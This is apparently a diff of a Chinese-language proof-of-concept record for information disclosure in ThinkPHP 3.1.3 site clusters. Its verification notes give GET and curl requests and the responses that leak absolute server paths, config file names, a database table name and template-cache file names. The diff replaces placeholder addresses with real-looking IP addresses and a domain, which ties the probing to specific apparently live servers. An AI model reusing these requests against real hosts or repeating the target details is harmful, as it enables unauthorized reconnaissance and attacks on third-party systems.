@@ -7,11 +7,11 @@
 - **severity**: medium
 - **source**: self
 - **verified**: 1
-- **verified_note**: 实测：① 192.0.2.2 任意页面（含 GET /Admin/Index/login 与登录失败页）尾部 think_page_trace 输出 15 个内部文件绝对路径（App/Runtime/~runtime.php、App/Conf/config.db.php、App/Conf/target406.example.com.php）、DB 驱动与表标识 online.admin、查询次数与错误堆栈；② GET /App/Lib/Action/Home/OrderAction.class.php/ → 200/158B "Fatal error: Class 'CommonAction' not found in /www/wwwroot/kkjjer_com/App/Lib/Action/Home/OrderAction.class.php on line 3"；对照 /App/Conf/config.php/ → 200/0B，证明 nginx 对 /App/ 下 .php 无 deny、尾斜杠触发 fastcgi_split_path_info 后被交 PHP-FPM 执行；③ 192.0.2.1 上 GET /App/Lib/Action/Admin/UserAction.class.php/x → 同类 Fatal error 回显 /www/wwwroot/thisthbweb_com/...；④ 模板缓存 md5 校验：md5('/www/wwwroot/kkjjer_com/App/Tpl/Admin/Index_login.html')=2b724962a4253c82acc4c93906e7589f → 对应 Cache/Admin 下文件 200。
+- **verified_note**: 实测：① 45.151.135.166 任意页面（含 GET /Admin/Index/login 与登录失败页）尾部 think_page_trace 输出 15 个内部文件绝对路径（App/Runtime/~runtime.php、App/Conf/config.db.php、App/Conf/config.site.php）、DB 驱动与表标识 online.admin、查询次数与错误堆栈；② GET /App/Lib/Action/Home/OrderAction.class.php/ → 200/158B "Fatal error: Class 'CommonAction' not found in /www/wwwroot/kkjjer_com/App/Lib/Action/Home/OrderAction.class.php on line 3"；对照 /App/Conf/config.php/ → 200/0B，证明 nginx 对 /App/ 下 .php 无 deny、尾斜杠触发 fastcgi_split_path_info 后被交 PHP-FPM 执行；③ 45.151.135.176 上 GET /App/Lib/Action/Admin/UserAction.class.php/x → 同类 Fatal error 回显 /www/wwwroot/thisthbweb_com/...；④ 模板缓存 md5 校验：md5('/www/wwwroot/kkjjer_com/App/Tpl/Admin/Index_login.html')=2b724962a4253c82acc4c93906e7589f → 对应 Cache/Admin 下文件 200。
 - **path**: pocs/thinkphp-3.1.3-站群两个零凭证原生语-think_page_trace-泄全部内部路径-app/poc.txt
 - **tags**: thinkphp3.1.3,站群,path-info,display_errors,page_trace,信息泄露,绝对路径
 - **created_at**: 2026-10-28T18:59:42.894Z
-- **engine**: 192.0.2.2 / https://target479.example.com
+- **engine**: 45.151.135.166 / https://thbac1dsua6v.csnsg36j8n.xyz
 
 ## 描述
 
@@ -35,7 +35,7 @@ curl -k "https://TARGET/App/Conf/config.php/"     # 200/0B = 存在且被执行
 
 ### A. think_page_trace 全开（零凭证）
 任意请求（含后台登录页、登录失败页）页面尾部输出：
-- 15 个加载文件的绝对路径（`/www/wwwroot/<项目>/App/Runtime/~runtime.php`、`App/Conf/config.db.php`、`App/Conf/target406.example.com.php` …）
+- 15 个加载文件的绝对路径（`/www/wwwroot/<项目>/App/Runtime/~runtime.php`、`App/Conf/config.db.php`、`App/Conf/config.site.php` …）
 - 后台控制器/模板编译缓存文件名
 - DB 驱动类与真实表标识（本例 `online.admin`）
 - `查询信息 : N queries M writes` 与错误堆栈
